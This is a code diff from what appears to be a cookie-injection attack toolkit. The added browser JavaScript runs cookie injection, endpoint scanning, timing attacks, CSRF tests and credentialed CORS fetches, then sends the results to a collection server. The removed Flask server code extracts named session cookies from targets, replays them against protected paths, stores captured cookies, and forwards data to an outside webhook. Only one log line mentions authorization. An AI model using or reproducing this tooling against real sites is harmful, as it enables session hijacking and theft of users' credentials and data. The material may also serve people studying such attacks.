+  const aStd = std(results.authenticated), uStd = std(results.unauthenticated);
+  const diff = Math.abs(aAvg - uAvg);
+  const sig = diff > (aStd + uStd);
+
+  hr();
+  log('TIMING RESULTS', 'success');
+  log(`Auth avg: ${aAvg.toFixed(2)}ms (±${aStd.toFixed(2)})`);
+  log(`Unauth avg: ${uAvg.toFixed(2)}ms (±${uStd.toFixed(2)})`);
+  log(`Diff: ${diff.toFixed(2)}ms  Significant: ${sig?'YES':'NO'}`, sig?'warning':'info');
+  hr();
+
+  return { results, aAvg, uAvg, diff, sig };
+}
+
+// ---------------------------------------------------------------------------
+// BATCH SCANNER
+// ---------------------------------------------------------------------------
+async function batchEndpointScan(baseTarget, cookieName, cookieValue) {
+  const endpoints = [
+    '/api/user','/api/profile','/api/account','/api/settings','/api/projects','/api/data',
+    '/api/admin','/graphql','/.well-known/security.txt','/v1/me','/v1/users/me'
+  ];
+  log(`Scanning ${endpoints.length} endpoints...`, 'info');
+  const results = [];
+
+  for (const ep of endpoints) {
+    log(`Testing ${ep}`);
+    const r = await cookieInjectionAttack({
+      target: baseTarget, path: ep, cookieName, cookieValue,
+      method: 'GET', cleanup: true, timeout: 3000
+    });
+    results.push({
+      endpoint: ep,
+      vulnerable: r.success && r.response?.status === 200,
+      status: r.response?.status || 'error',
+      corsHeaders: r.response?.corsHeaders || {}
+    });
+    await new Promise(r => setTimeout(r, 300));
+  }
+
+  const vul = results.filter(x=>x.vulnerable);
+  hr();
+  log(`BATCH DONE – ${vul.length}/${results.length} vulnerable`, vul.length?'warning':'success');
+  vul.forEach(v => log(`  OK ${v.endpoint} (${v.status})`, 'warning'));
+  hr();
+  return results;
+}
+
+// ---------------------------------------------------------------------------
+// EVENT HANDLERS
+// ---------------------------------------------------------------------------
+document.getElementById('basicInjection').onclick = async () => {
+  clear();
+  const cfg = getConfig();
+  setStatus('Basic injection…', 'info');
+  const r = await cookieInjectionAttack(cfg);
+  setStatus(r.success?'OK':'Failed', r.success?'success':'error');
+  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
+};
+
+document.getElementById('advancedInjection').onclick = async () => {
+  clear();
+  const cfg = getConfig({ vectors: ['standard','quoted','version','dummy'] });
+  setStatus('Multi-vector…', 'info');
+  const r = await cookieInjectionAttack(cfg);
+  setStatus(r.success?'OK':'Failed', r.success?'success':'error');
+  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
+};
+
+document.getElementById('timingAttack').onclick = async () => {
+  clear();
+  const cfg = getConfig({ method:'GET' });
+  setStatus('Timing analysis…', 'info');
+  const r = await timingAttackAnalysis(cfg);
+  setStatus('Done', 'success');
+  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
+};
+
+document.getElementById('batchTest').onclick = async () => {
+  clear();
+  const base = document.getElementById('target').value.trim();
+  const cn = document.getElementById('cookieName').value.trim();
+  const cv = document.getElementById('cookieValue').value.trim();
+  setStatus('Batch scan…', 'info');
+  const r = await batchEndpointScan(base, cn, cv);
+  const vul = r.filter(x=>x.vulnerable).length;
+  setStatus(`${vul} vulnerable`, vul?'warning':'success');
+  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
+};
+
+document.getElementById('csrfTest').onclick = async () => {
+  clear();
+  log('CSRF test (state-changing)…', 'warning');
+  const cfg = getConfig({
+    method: document.getElementById('method').value,
+    body: JSON.stringify({action:'csrf_test', ts:Date.now(), id:crypto.randomUUID?.()||Math.random().toString(36).substr(2,9)})
+  });
+  setStatus('CSRF test…', 'warning');
+  const r = await cookieInjectionAttack(cfg);
+  if (r.success && r.response?.status < 300) {
+    log('CSRF succeeded – critical!', 'error');
+    setStatus('CSRF possible', 'error');
+  } else {
+    log('CSRF blocked', 'info');
+    setStatus('CSRF blocked', 'success');
+  }
+  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
+};
+
+document.getElementById('automatedExfil').onclick = async () => {
+  clear();
+  const cfg = getConfig({ method:'GET' });
+  setStatus('Full chain…', 'warning');
+  const r = await cookieInjectionAttack(cfg);
+  const ok = await exfiltrateToServer(r);
+  setStatus(ok?'Exfiltrated':'Failed', ok?'success':'error');
+};
+
+document.getElementById('proxyFetch').onclick = async () => {
+  clear();
+  const server = getServerUrl();
+  const target = document.getElementById('target').value.trim() + document.getElementById('path').value.trim();
+  const payload = { targetUrl: target, method: document.getElementById('method').value };
+  log(`Proxy fetch to ${target}`, 'info');
+  try {
+    const res = await fetch(server + '/proxy-fetch', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(payload)
+    });
+    const data = await res.json();
+    if (data.ok) {
+      log('Proxy response OK', 'success');
+      log(JSON.stringify(data.data, null, 2).slice(0,1500));
+      if (document.getElementById('autoExfil').checked) await exfiltrateToServer(data.data);
+    } else {
+      log(`Proxy error: ${data.error}`, 'error');
     }
+  } catch (e) {
+    log(`Proxy failed: ${e.message}`, 'error');
+  }
+};
 
-    # Optionally include raw set-cookie strings only if explicitly allowed
-    if (not redact_cookie_values) and os.environ.get("ALLOW_RAW_COOKIE_VALUES") == "1":
-        result["set_cookie_raw"] = set_cookie_list
+document.getElementById('directCorsTest').onclick = async () => {
+  clear();
+  const url = document.getElementById('target').value.trim() + document.getElementById('path').value.trim();
+  log(`Direct credentialed fetch to ${url}`, 'info');
+  try {
+    const r = await fetch(url, { method:'GET', credentials:'include', mode:'cors' });
+    const txt = await r.text();
+    log(`Status ${r.status}`, r.ok?'success':'warning');
+    log(txt.slice(0,800));
+    if (document.getElementById('autoExfil').checked) await exfiltrateToServer({url, status:r.status, body:txt});
+  } catch (e) {
+    log(`CORS blocked (expected): ${e.message}`, 'warning');
+  }
+};
 
-    return result
+document.getElementById('clearLog').onclick = clear;
 
+document.getElementById('downloadEvidence').onclick = () => {
+  const payload = {
+    timestamp: new Date().toISOString(),
+    logs: logBuffer,
+    results: testResults,
+    metadata: { userAgent: navigator.userAgent, origin: window.location.origin }
+  };
+  const blob = new Blob([JSON.stringify(payload, null, 2)], {type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `evidence-${Date.now()}.json`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+  setStatus('Downloaded', 'success');
+};
 
-@app.route('/extract-cookies', methods=['POST'])
-def extract_cookies():
-    """
-    Extract specific cookies from target and prepare them for use
-    """
-    data = request.get_json(force=True)
-    target_origin = data.get('targetOrigin')
-    path = data.get('path', '/')
-    cookie_names = data.get('cookieNames', ['__cf_bm', '_dd_s', 'kdid', 'thx_guid', 'tmx_guid', 'klp_device_id', 'klp_ls_id', 'sessionId', 'session', 'klp_ls_id', 'KC_STATE_CHECKER', 'KC_AUTH_SESSION_HASH', 'aws-waf-token', 'KEYCLOAK_SESSION'])
-    
-    if not target_origin:
-        return jsonify({'ok': False, 'error': 'targetOrigin required'}), 400
-    
-    try:
-        target_url = target_origin.rstrip('/') + path
-        
-        print(f"\n{'='*60}")
-        print(f"Extracting cookies from: {target_url}")
-        print(f"Target cookies: {', '.join(cookie_names)}")
-        print(f"{'='*60}")
-        
-        # Make request to get cookies
-        r = requests.get(
-            target_url,
-            allow_redirects=True,
-            timeout=15,
-            headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
-        )
-        
-        # Extract requested cookies
-        extracted = {}
-        for cookie in r.cookies:
-            if cookie.name in cookie_names:
-                extracted[cookie.name] = {
-                    'value': cookie.value,
-                    'domain': cookie.domain,
-                    'path': cookie.path,
-                    'secure': cookie.secure,
-                    'httponly': cookie.has_nonstandard_attr('HttpOnly') or False,
-                    'sameSite': cookie.get_nonstandard_attr('SameSite', 'None')
-                }
-                print(f"✓ Extracted: {cookie.name}")
-                print(f"  Value: {cookie.value[:30]}...")
-                print(f"  HttpOnly: {extracted[cookie.name]['httponly']}")
-                print(f"  Secure: {extracted[cookie.name]['secure']}")
-        
-        missing = set(cookie_names) - set(extracted.keys())
-        if missing:
-            print(f"⚠ Missing cookies: {', '.join(missing)}")
-        
-        print(f"{'='*60}\n")
-        
-        # Format for easy reuse
-        cookie_header = '; '.join([f"{name}={data['value']}" for name, data in extracted.items()])
-        
-        return jsonify({
-            'ok': True,
-            'extracted_cookies': extracted,
-            'cookie_header': cookie_header,  # Ready-to-use Cookie header value
-            'found_count': len(extracted),
-            'missing_cookies': list(missing)
-        })
-        
-    except Exception as e:
-        print(f"✗ Error: {e}\n")
-        return jsonify({'ok': False, 'error': str(e)}), 500
+document.getElementById('copyResults').onclick = () => {
+  navigator.clipboard.writeText(logBuffer.join('\n')).then(() => setStatus('Copied','success')).catch(() => setStatus('Copy failed','error'));
+};
 
-# Add this endpoint to your app.py (after the existing endpoints)
+// ---------------------------------------------------------------------------
+// MANUAL COOKIE & NOTES
+// ---------------------------------------------------------------------------
+document.getElementById('setCookieBtn').onclick = () => {
+  const name = document.getElementById('manualCookieName').value.trim();
+  const val  = document.getElementById('manualCookieValue').value.trim();
+  document.cookie = `${name}=${val}; path=/`;
+  log(`Set cookie ${name}=${val}`, 'info');
+};
 
-@app.route('/collect-evidence', methods=['POST'])
-def collect_evidence():
-    """
-    Collect evidence from enhanced cookie injection tests
-    Stores results and optionally forwards to n8n webhook
-    """
-    data = request.get_json(force=True)
-    evidence_type = data.get('type', 'unknown')
-    timestamp = data.get('timestamp')
-    test_data = data.get('data', {})
-    metadata = data.get('metadata', {})
-    
-    # Generate unique evidence ID
-    evidence_id = f"{evidence_type}-{int(time.time())}-{str(uuid.uuid4())[:8]}"
-    
-    print(f"\n{'='*70}")
-    print(f"📥 EVIDENCE RECEIVED: {evidence_type}")
-    print(f"{'='*70}")
-    print(f"Evidence ID: {evidence_id}")
-    print(f"Timestamp: {timestamp}")
-    print(f"User Agent: {metadata.get('userAgent', 'unknown')}")
-    
-    # Log key details
-    if evidence_type == 'cookie_injection_evidence':
-        print(f"\nCookie Injection Test:")
-        print(f"  Target: {test_data.get('target', 'unknown')}")
-        print(f"  Success: {test_data.get('success', False)}")
-        print(f"  Cookie: {test_data.get('cookieName', 'unknown')}")
-        
-        if test_data.get('response'):
-            print(f"  Status: {test_data['response'].get('status', 'N/A')}")
-            
-        if test_data.get('timing'):
-            print(f"  Timing: {test_data['timing'].get('total', 0):.2f}ms")
-            
-        if test_data.get('vectors'):
-            print(f"  Vectors tested: {len(test_data.get('vectors', []))}")
-            successful_vectors = [v['name'] for v in test_data.get('vectors', []) if v.get('success')]
-            if successful_vectors:
-                print(f"  Successful: {', '.join(successful_vectors)}")
-    
-    print(f"{'='*70}\n")
-    
-    # Save to file
-    evidence_record = {
-        'evidence_id': evidence_id,
-        'type': evidence_type,
-        'timestamp': timestamp,
-        'data': test_data,
-        'metadata': metadata,
-        'received_at': datetime.utcnow().isoformat()
-    }
-    
-    try:
-        # Append to evidence log
-        with open('cookie_injection_evidence.jsonl', 'a', encoding='utf-8') as f:
-            f.write(json.dumps(evidence_record) + '\n')
-        
-        print(f"✓ Evidence saved to cookie_injection_evidence.jsonl")
-        
-        # Optionally forward to n8n webhook
-        forward_to_n8n = False
-        if N8N_CANARY_WEBHOOK and test_data.get('success'):
-            try:
-                webhook_payload = {
-                    'event': 'cookie_injection_success',
-                    'evidence_id': evidence_id,
-                    'timestamp': timestamp,
-                    'target': test_data.get('target'),
-                    'cookie_name': test_data.get('cookieName'),
-                    'status': test_data.get('response', {}).get('status'),
-                    'cors_headers': test_data.get('response', {}).get('corsHeaders', {}),
-                    'metadata': metadata
-                }
-                
-                webhook_response = requests.post(
-                    N8N_CANARY_WEBHOOK,
-                    json=webhook_payload,
-                    timeout=5
-                )
-                
-                if webhook_response.ok:
-                    print(f"✓ Evidence forwarded to n8n webhook")
-                    forward_to_n8n = True
-                else:
-                    print(f"⚠ n8n webhook returned {webhook_response.status_code}")
-                    
-            except Exception as e:
-                print(f"⚠ n8n webhook failed: {e}")
-        
-        return jsonify({
-            'ok': True,
-            'evidence_id': evidence_id,
-            'saved_to': 'cookie_injection_evidence.jsonl',
-            'webhook_forwarded': forward_to_n8n
-        })
-        
-    except Exception as e:
-        print(f"✗ Error saving evidence: {e}\n")
-        return jsonify({'ok': False, 'error': str(e)}), 500
+document.getElementById('showCookiesBtn').onclick = () => {
+  log('Current cookies:', 'info');
+  log(document.cookie || '(none)', 'info');
+};
 
+document.getElementById('sendNotes').onclick = async () => {
+  const raw = document.getElementById('notes').value.trim();
+  if (!raw) { setNotesStatus('Empty notes', true); return; }
+  const payload = {
+    notes: raw.slice(0,20000),
+    target: document.getElementById('target').value || location.href,
+    timestamp: new Date().toISOString(),
+    user_agent: navigator.userAgent
+  };
+  const btn = document.getElementById('sendNotes');
+  btn.disabled = true; btn.textContent = 'Sending…';
+  try {
+    const res = await fetch(getServerUrl() + '/notes', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(payload)
+    });
+    if (!res.ok) throw new Error(`${res.status}`);
+    setNotesStatus('Sent OK ' + new Date().toISOString());
+  } catch (e) {
+    setNotesStatus('Failed – saved locally', true);
+    try { localStorage.setItem('notes_'+Date.now(), JSON.stringify(payload)); } catch (_) {}
+  } finally {
+    btn.disabled = false; btn.textContent = 'Send Notes to Server';
+  }
+};
 
-@app.route('/get-evidence', methods=['GET'])
-def get_evidence():
-    """
-    Retrieve collected evidence
-    """
-    try:
-        if not os.path.exists('cookie_injection_evidence.jsonl'):
-            return jsonify({'ok': True, 'evidence': [], 'count': 0})
-        
-        evidence = []
-        with open('cookie_injection_evidence.jsonl', 'r', encoding='utf-8') as f:
-            for line in f:
-                if line.strip():
-                    evidence.append(json.loads(line))
-        
-        # Optional: Filter by type
-        evidence_type = request.args.get('type')
-        if evidence_type:
-            evidence = [e for e in evidence if e.get('type') == evidence_type]
-        
-        # Optional: Limit results
-        limit = request.args.get('limit', type=int)
-        if limit:
-            evidence = evidence[-limit:]
-        
-        return jsonify({
-            'ok': True,
-            'evidence': evidence,
-            'count': len(evidence)
-        })
-        
-    except Exception as e:
-        return jsonify({'ok': False, 'error': str(e)}), 500
+document.getElementById('clearNotes').onclick = () => {
+  if (confirm('Clear notes?')) {
+    document.getElementById('notes').value = '';
+    setNotesStatus('Cleared');
+  }
+};
 
-
-@app.route('/evidence-dashboard', methods=['GET'])
-def evidence_dashboard():
-    """
-    Simple HTML dashboard to view collected evidence
-    """
-    try:
-        if not os.path.exists('cookie_injection_evidence.jsonl'):
-            evidence = []
-        else:
-            evidence = []
-            with open('cookie_injection_evidence.jsonl', 'r', encoding='utf-8') as f:
-                for line in f:
-                    if line.strip():
-                        evidence.append(json.loads(line))
-        
-        # Generate simple HTML
-        html = """
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Evidence Dashboard</title>
-            <style>
-                body { font-family: monospace; background: #0a0e1a; color: #d6ffe6; padding: 20px; }
-                .evidence { background: #131823; padding: 15px; margin: 10px 0; border-radius: 8px; border: 1px solid #1e2837; }
-                .success { color: #6ee7b7; }
-                .error { color: #fca5a5; }
-                .warning { color: #fcd34d; }
-                h1 { color: #6ee7b7; }
-                h3 { color: #93c5fd; margin-top: 0; }
-                pre { background: #0b1020; padding: 10px; border-radius: 4px; overflow-x: auto; }
-            </style>
-        </head>
-        <body>
-            <h1>🔒 Cookie Injection Evidence Dashboard</h1>
-            <p>Total Evidence Records: <span class="success">""" + str(len(evidence)) + """</span></p>
-            <hr>
-        """
-        
-        for i, e in enumerate(reversed(evidence), 1):
-            data = e.get('data', {})
-            success = data.get('success', False)
-            status_class = 'success' if success else 'error'
-            
-            html += f"""
-            <div class="evidence">
-                <h3>Evidence #{i} - {e.get('evidence_id', 'unknown')}</h3>
-                <p><strong>Type:</strong> {e.get('type', 'unknown')}</p>
-                <p><strong>Timestamp:</strong> {e.get('timestamp', 'N/A')}</p>
-                <p><strong>Target:</strong> {data.get('target', 'N/A')}</p>
-                <p><strong>Success:</strong> <span class="{status_class}">{success}</span></p>
-                <p><strong>Cookie:</strong> {data.get('cookieName', 'N/A')}</p>
-            """
-            
-            if data.get('response'):
-                html += f"""<p><strong>Response Status:</strong> {data['response'].get('status', 'N/A')}</p>"""
-                
-                if data['response'].get('corsHeaders'):
-                    html += f"""
-                    <p><strong>CORS Headers:</strong></p>
-                    <pre>{json.dumps(data['response']['corsHeaders'], indent=2)}</pre>
-                    """
-            
-            if data.get('timing'):
-                html += f"""
-                <p><strong>Timing:</strong> 
-                   Injection: {data['timing'].get('injection', 0):.2f}ms, 
-                   Request: {data['timing'].get('request', 0):.2f}ms, 
-                   Total: {data['timing'].get('total', 0):.2f}ms
-                </p>
-                """
-            
-            if data.get('vectors'):
-                successful = [v['name'] for v in data['vectors'] if v.get('success')]
-                html += f"""<p><strong>Successful Vectors:</strong> {', '.join(successful) if successful else 'None'}</p>"""
-            
-            if data.get('error'):
-                html += f"""<p class="error"><strong>Error:</strong> {data['error']}</p>"""
-            
-            html += """</div>"""
-        
-        html += """
-        </body>
-        </html>
-        """
-        
-        return html
-        
-    except Exception as e:
-        return f"<html><body><h1>Error</h1><p>{e}</p></body></html>", 500
-
-@app.route('/test-with-cookies', methods=['POST'])
-def test_with_cookies():
-    """
-    Test endpoint using extracted cookies
-    """
-    data = request.get_json(force=True)
-    target_origin = data.get('targetOrigin')
-    test_path = data.get('testPath', '/api/protected')
-    cookies = data.get('cookies', {})  # Dict of {cookie_name: cookie_value}
-    
-    if not target_origin:
-        return jsonify({'ok': False, 'error': 'targetOrigin required'}), 400
-    
-    try:
-        target_url = target_origin.rstrip('/') + test_path
-        
-        # Build cookie header
-        cookie_header = '; '.join([f"{name}={value}" for name, value in cookies.items()])
-        
-        print(f"\n{'='*60}")
-        print(f"Testing with cookies: {target_url}")
-        print(f"Cookies: {cookie_header[:100]}...")
-        print(f"{'='*60}")
-        
-        r = requests.get(
-            target_url,
-            headers={
-                'Cookie': cookie_header,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            },
-            timeout=15
-        )
-        
-        print(f"Response: {r.status_code}")
-        print(f"{'='*60}\n")
-        
-        return jsonify({
-            'ok': True,
-            'status': r.status_code,
-            'response_preview': r.text[:500],
-            'cookies_sent': list(cookies.keys())
-        })
-        
-    except Exception as e:
-        print(f"✗ Error: {e}\n")
-        return jsonify({'ok': False, 'error': str(e)}), 500
-
-@app.route('/save-evidence', methods=['POST'])
-def save_evidence():
-    data = request.get_json(force=True)
-    print("Evidence received:", len(data.get("lines", [])), "lines")
-    
-    with open('evidence.txt', 'a', encoding='utf-8') as f:
-        f.write(json.dumps(data, indent=2) + '\n')
-        f.write('\n' + '='*60 + '\n\n')
-    
-    return jsonify({"status": "success", "lines": len(data.get("lines", []))})
-
-@app.route('/save-cookies', methods=['POST'])
-def save_cookies():
-    """
-    Save captured cookies to file and optionally forward to webhook
-    """
-    data = request.get_json(force=True)
-    target_origin = data.get('target_origin')
-    cookies = data.get('cookies', {})
-    timestamp = data.get('timestamp')
-    user_agent = data.get('user_agent', 'unknown')
-    
-    if not cookies:
-        return jsonify({'ok': False, 'error': 'No cookies provided'}), 400
-    
-    print(f"\n{'='*60}")
-    print(f"🍪 COOKIES CAPTURED from {target_origin}")
-    print(f"{'='*60}")
-    print(f"Timestamp: {timestamp}")
-    print(f"Cookie Count: {len(cookies)}")
-    print(f"\nCookies:")
-    for name, value in cookies.items():
-        print(f"  {name} = {value[:50]}{'...' if len(value) > 50 else ''}")
-    print(f"{'='*60}\n")
-    
-    # Save to file
-    capture_data = {
-        'target_origin': target_origin,
-        'timestamp': timestamp,
-        'user_agent': user_agent,
-        'cookies': cookies,
-        'cookie_count': len(cookies)
-    }
-    
-    try:
-        # Append to JSON lines file
-        with open('captured_cookies.jsonl', 'a', encoding='utf-8') as f:
-            f.write(json.dumps(capture_data) + '\n')
-        
-        print(f"✓ Saved to captured_cookies.jsonl")
-        
-        return jsonify({
-            'ok': True,
-            'saved_count': len(cookies),
-            'saved_to': 'captured_cookies.jsonl'
-        })
-        
-    except Exception as e:
-        print(f"✗ Error saving: {e}\n")
-        return jsonify({'ok': False, 'error': str(e)}), 500
-
-
-@app.route('/get-captured-cookies', methods=['GET'])
-def get_captured_cookies():
-    """
-    Retrieve all captured cookies from file
-    """
-    try:
-        if not os.path.exists('captured_cookies.jsonl'):
-            return jsonify({'ok': True, 'captures': [], 'count': 0})
-        
-        captures = []
-        with open('captured_cookies.jsonl', 'r', encoding='utf-8') as f:
-            for line in f:
-                if line.strip():
-                    captures.append(json.loads(line))
-        
-        return jsonify({
-            'ok': True,
-            'captures': captures,
-            'count': len(captures)
-        })
-        
-    except Exception as e:
-        return jsonify({'ok': False, 'error': str(e)}), 500
-
-
-@app.route('/forward-to-webhook', methods=['POST'])
-def forward_to_webhook():
-    """
-    Forward arbitrary data to your n8n webhook
-    """
-    data = request.get_json(force=True)
-    webhook_url = data.get('webhookUrl', N8N_CANARY_WEBHOOK)
-    payload = data.get('payload', {})
-    
-    if not webhook_url:
-        return jsonify({'ok': False, 'error': 'webhookUrl required'}), 400
-    
-    try:
-        print(f"\n{'='*60}")
-        print(f"📤 Forwarding to webhook: {webhook_url}")
-        print(f"Payload size: {len(json.dumps(payload))} bytes")
-        print(f"{'='*60}")
-        
-        r = requests.post(
-            webhook_url,
-            json=payload,
-            headers={'Content-Type': 'application/json'},
-            timeout=10
-        )
-        
-        print(f"Response: {r.status_code}")
-        print(f"{'='*60}\n")
-        
-        return jsonify({
-            'ok': r.ok,
-            'status': r.status_code,
-            'response': r.text[:500]
-        })
-        
-    except Exception as e:
-        print(f"✗ Webhook error: {e}\n")
-        return jsonify({'ok': False, 'error': str(e)}), 500
-
-@app.route('/log-cookies', methods=['POST', 'GET'])
-def log_cookies():
-    cookies = request.cookies  # Flask provides cookies as a dict
-    # Store each cookie in cache
-    for name, value in cookies.items():
-        cookie_cache[name] = value
-    return jsonify({'status': 'stored', 'cookies': list(cookies.keys())})
-
-@app.errorhandler(404)
-def not_found(e):
-    return jsonify({"error": "not found", "path": request.path}), 404
-
-if __name__ == "__main__":
-    print("\n" + "="*70)
-    print("🚀 Flask PoC Server Starting")
-    print("="*70)
-    print(f"📍 Server: http://127.0.0.1:5000")
-    print(f"🪝 n8n Canary: {N8N_QUERY_WEBHOOK}")
-    print(f"🔍 n8n Query: {N8N_QUERY_WEBHOOK}")
-    print(f"🛡️  Fallback Canary: http://127.0.0.1:5000/canary")
-    print("="*70)
-    print("\n⚠️  IMPORTANT: Make sure both n8n workflows are ACTIVE (not listening)")
-    print("   1. Open n8n and find your workflows")
-    print("   2. Click the toggle switch in top-right to make it GREEN/ACTIVE")
-    print("   3. It should say 'Active' not 'Inactive' or 'Waiting for trigger'")
-    print("   4. Copy the Production URL from each webhook node")
-    print("   5. Update N8N_QUERY_WEBHOOK and N8N_QUERY_WEBHOOK above")
-    print("="*70 + "\n")
-    
-    # Test n8n connectivity on startup
-    test_n8n_connectivity()
-    
-    app.run(host="0.0.0.0", port=5000, debug=True)
+// ---------------------------------------------------------------------------
+// INIT
+// ---------------------------------------------------------------------------
+log('Enhanced Cookie Injection Module loaded', 'success');
+log('Ready – use only in authorized environments', 'warning');
+hr();
+</script>
